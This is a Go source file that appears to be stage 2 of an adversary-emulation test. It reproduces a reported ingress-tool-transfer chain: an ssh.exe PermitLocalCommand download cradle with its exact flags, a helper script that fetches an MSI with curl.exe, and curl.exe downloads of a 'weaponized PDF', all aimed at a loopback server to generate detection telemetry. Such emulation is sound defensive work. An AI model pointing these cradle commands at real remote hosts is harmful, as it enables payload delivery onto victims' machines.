//go:build windows
// +build windows

/*
STAGE 2: Ingress Tool Transfer via LOLBin Cradle (T1105)
Simulates the RedFlick transfer primitives documented by Microsoft:

  January variant: ssh.exe invoked with PermitLocalCommand so a "local
  command" executes client-side after connect — abused as a download cradle
  for a remotely hosted MSI.

  July variant: curl.exe (system binary) downloads a weaponized PDF; an
  embedded base64 command is extracted and executed by PowerShell (the
  extraction itself is Stage 3, T1059.001).

Sandbox mapping: the ssh.exe cradle targets 127.0.0.1 with BatchMode and
expects a credential refusal — exercising the exact flag surface generates
the same process-creation telemetry as the real chain. The payload fetches
(curl.exe) are served by the orchestrator's loopback HTTP server; no traffic
leaves the machine.

Lab finding (2026-09-30, Win11 26200): a LocalCommand value containing
spaces/quotes makes the Windows OpenSSH client hang indefinitely (Go's
argv quoting emits embedded \" escapes the client cannot parse). The cradle
therefore passes a single-token LocalCommand pointing at a helper script
that performs the MSI fetch — same PermitLocalCommand flag surface, same
intent, deterministic exit. All ssh/curl child executions are additionally
bounded by hard timeouts so no client state can hang a stage.
*/

package main

import (
	"context"
	"fmt"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"
)

const (
	TEST_UUID      = "c3b4301e-b502-43a4-9f01-66a874239d1b"
	TECHNIQUE_ID   = "T1105"
	TECHNIQUE_NAME = "Ingress Tool Transfer (ssh.exe / curl.exe LOLBin Cradle)"
	STAGE_ID       = 2
)

const (
	StageSuccess     = 0
	StageBlocked     = 126
	StageQuarantined = 105
	StageError       = 999
)

func main() {
	AttachLogger(TEST_UUID, fmt.Sprintf("Stage %d: %s", STAGE_ID, TECHNIQUE_ID))
	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Starting %s", TECHNIQUE_NAME))
	LogStageStart(STAGE_ID, TECHNIQUE_ID, "ssh.exe PermitLocalCommand cradle + curl.exe payload fetch (loopback)")

	if err := performTechnique(); err != nil {
		fmt.Printf("[STAGE %s] Technique failed: %v\n", TECHNIQUE_ID, err)
		LogMessage("ERROR", TECHNIQUE_ID, fmt.Sprintf("Technique failed: %v", err))
		exitCode := determineExitCode(err)
		if exitCode == StageBlocked || exitCode == StageQuarantined {
			LogStageBlocked(STAGE_ID, TECHNIQUE_ID, err.Error())
		} else {
			LogStageEnd(STAGE_ID, TECHNIQUE_ID, "error", err.Error())
		}
		os.Exit(exitCode)
	}

	fmt.Printf("[STAGE %s] LOLBin transfer cradle completed\n", TECHNIQUE_ID)
	LogMessage("SUCCESS", TECHNIQUE_ID, "ssh.exe cradle exercised; weaponized PDF + MSI fetched via curl.exe")
	LogStageEnd(STAGE_ID, TECHNIQUE_ID, "success", "transfer primitives exercised against loopback host")
	os.Exit(StageSuccess)
}

func performTechnique() error {
	port := os.Getenv("F0_LOOPBACK_PORT")
	if port == "" {
		return fmt.Errorf("prerequisite missing: F0_LOOPBACK_PORT not set (orchestrator loopback server required)")
	}
	baseURL := fmt.Sprintf("http://127.0.0.1:%s", port)

	// ---------------------------------------------------------------
	// Primitive 1 — ssh.exe PermitLocalCommand cradle (January chain)
	// ---------------------------------------------------------------
	// Exact flag surface from the disclosure. In the real attack the
	// LocalCommand downloads/executes the remotely hosted MSI. Here the
	// cradle points at the loopback listener; a credential refusal is the
	// expected sandbox outcome and the command-line telemetry is the
	// observable under test.
	sshAvailable := false
	conn, err := net.DialTimeout("tcp", "127.0.0.1:22", 3*time.Second)
	if err == nil {
		sshAvailable = true
		_ = conn.Close()
	}

	if sshAvailable {
		// The LocalCommand value must be a SINGLE TOKEN (no spaces, no quotes):
		// Go's argv quoting emits embedded \" escapes that hang the Windows
		// OpenSSH client (reproduced on Win11 26200 — lab finding 2026-09-30).
		// The cradle's intent (LocalCommand fetches the MSI) is preserved by
		// pointing at a helper script the stage writes first.
		msiDest := filepath.Join(LOG_DIR, "setup.msi")
		helperPath := filepath.Join(LOG_DIR, "f0ldcmd.cmd")
		helper := fmt.Sprintf("@echo off\r\ncurl.exe -s -S --max-time 30 -o \"%s\" %s/assets/setup.msi\r\n", msiDest, baseURL)
		if err := os.WriteFile(helperPath, []byte(helper), 0755); err != nil {
			return fmt.Errorf("LocalCommand helper write failed: %v", err)
		}
		LogFileDropped("f0ldcmd.cmd", helperPath, int64(len(helper)), false)

		sshArgs := []string{
			"-o", "PermitLocalCommand=yes",
			"-o", "LocalCommand=" + helperPath,
			"-o", "StrictHostKeyChecking=no",
			"-o", "BatchMode=yes",
			"-o", "ConnectTimeout=5",
			"redflick-sandbox@127.0.0.1",
			"exit",
		}

		// Hard bound on the whole ssh call — ConnectTimeout only bounds TCP,
		// and a pathological client state must never hang the stage (the
		// orchestrator watchdog would otherwise burn 180s here).
		ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
		defer cancel()
		cmd := exec.CommandContext(ctx, filepath.Join(os.Getenv("SystemRoot"), "System32", "OpenSSH", "ssh.exe"), sshArgs...)
		out, sshErr := cmd.CombinedOutput()
		exit := exitCodeOf(sshErr)
		if ctx.Err() == context.DeadlineExceeded {
			exit = 102
		}
		LogProcessExecution("ssh.exe", fmt.Sprintf("ssh.exe %s", strings.Join(maskArg(sshArgs, "LocalCommand="), " ")), pidOf(cmd), sshErr == nil, exit, strings.TrimSpace(string(out)))
		// Credential refusal is the expected sandbox outcome — NOT a protection
		// event (Rule 8). The cradle primitive counts as exercised either way:
		// the exact flag surface generated its process-creation telemetry.
		if exit == 102 {
			LogMessage("WARN", TECHNIQUE_ID, "ssh.exe did not return within 30s and was terminated — cradle telemetry already generated; continuing")
		} else {
			LogMessage("INFO", TECHNIQUE_ID,
				fmt.Sprintf("ssh.exe cradle exercised (exit %d) — credential refusal expected in sandbox; flag surface generated", exit))
		}
	} else {
		LogMessage("INFO", TECHNIQUE_ID, "no listener on 127.0.0.1:22 — ssh.exe cradle primitive skipped with note (loopback SSH absent)")
	}

	// ---------------------------------------------------------------
	// Primitive 2 — curl.exe payload fetch (July chain + MSI retrieval)
	// ---------------------------------------------------------------
	pdfDest := filepath.Join(LOG_DIR, "invite.pdf")
	if err := curlFetch(baseURL+"/assets/invite.pdf", pdfDest); err != nil {
		return fmt.Errorf("curl fetch of invite.pdf failed: %v", err)
	}
	pdfData, err := os.ReadFile(pdfDest)
	if err != nil {
		return fmt.Errorf("reading fetched invite.pdf failed: %v", err)
	}
	if !strings.Contains(string(pdfData), "cAB") {
		return fmt.Errorf("fetched invite.pdf does not contain the cAB payload marker")
	}
	LogFileDropped("invite.pdf", pdfDest, int64(len(pdfData)), false)
	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("weaponized PDF staged (%d bytes, cAB marker verified)", len(pdfData)))

	msiDest := filepath.Join(LOG_DIR, "setup.msi")
	if err := curlFetch(baseURL+"/assets/setup.msi", msiDest); err != nil {
		return fmt.Errorf("curl fetch of setup.msi failed: %v", err)
	}
	msiData, err := os.ReadFile(msiDest)
	if err != nil {
		return fmt.Errorf("reading fetched setup.msi failed: %v", err)
	}
	if len(msiData) == 0 {
		return fmt.Errorf("fetched setup.msi is empty")
	}
	LogFileDropped("setup.msi", msiDest, int64(len(msiData)), false)
	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("MSI package staged (%d bytes) for Stage 4", len(msiData)))

	return nil
}

// curlFetch runs the system curl.exe against the loopback server —
// using the OS binary (not a Go HTTP client) so the exact process-creation
// telemetry of the July chain is generated. --max-time bounds every fetch.
func curlFetch(url, dest string) error {
	ctx, cancel := context.WithTimeout(context.Background(), 45*time.Second)
	defer cancel()
	cmd := exec.CommandContext(ctx, filepath.Join(os.Getenv("SystemRoot"), "System32", "curl.exe"),
		"-s", "-S", "--max-time", "30", "-o", dest, url)
	out, err := cmd.CombinedOutput()
	LogProcessExecution("curl.exe", fmt.Sprintf("curl.exe -s -S --max-time 30 -o %s %s", dest, url), pidOf(cmd), err == nil, exitCodeOf(err), strings.TrimSpace(string(out)))
	if ctx.Err() == context.DeadlineExceeded {
		return fmt.Errorf("curl fetch of %s did not return within 45s", dest)
	}
	if err != nil {
		return fmt.Errorf("curl.exe exited %d: %s", exitCodeOf(err), strings.TrimSpace(string(out)))
	}
	if _, statErr := os.Stat(dest); os.IsNotExist(statErr) {
		return fmt.Errorf("destination file not present after fetch: %s", dest)
	}
	return nil
}

// maskArg shortens the LocalCommand value in logged command lines so the
// log stays readable while the flags remain visible.
func maskArg(args []string, prefix string) []string {
	masked := make([]string, len(args))
	for i, a := range args {
		if strings.HasPrefix(a, prefix) {
			masked[i] = prefix + "<cradle-command>"
		} else {
			masked[i] = a
		}
	}
	return masked
}

func exitCodeOf(err error) int {
	if err == nil {
		return 0
	}
	if exitErr, ok := err.(*exec.ExitError); ok {
		return exitErr.ExitCode()
	}
	return 999
}

func pidOf(cmd *exec.Cmd) int {
	if cmd != nil && cmd.Process != nil {
		return cmd.Process.Pid
	}
	return 0
}

func determineExitCode(err error) int {
	if err == nil {
		return StageSuccess
	}
	errStr := err.Error()
	if containsAny(errStr, []string{"access denied", "access is denied", "permission denied", "operation not permitted"}) {
		return StageBlocked
	}
	if containsAny(errStr, []string{"quarantined", "virus", "threat"}) {
		return StageQuarantined
	}
	if containsAny(errStr, []string{"not found", "not present", "does not exist", "no such", "not running", "not available", "prerequisite missing"}) {
		return StageError
	}
	return StageError
}

func containsAny(s string, substrings []string) bool {
	for _, substr := range substrings {
		if containsCI(s, substr) {
			return true
		}
	}
	return false
}

func containsCI(s, substr string) bool {
	return len(s) >= len(substr) && indexIgnoreCase(s, substr) >= 0
}

func indexIgnoreCase(s, substr string) int {
	s = toLowerStr(s)
	substr = toLowerStr(substr)
	for i := 0; i <= len(s)-len(substr); i++ {
		if s[i:i+len(substr)] == substr {
			return i
		}
	}
	return -1
}

func toLowerStr(s string) string {
	result := make([]byte, len(s))
	for i := 0; i < len(s); i++ {
		c := s[i]
		if c >= 'A' && c <= 'Z' {
			c = c + ('a' - 'A')
		}
		result[i] = c
	}
	return string(result)
}
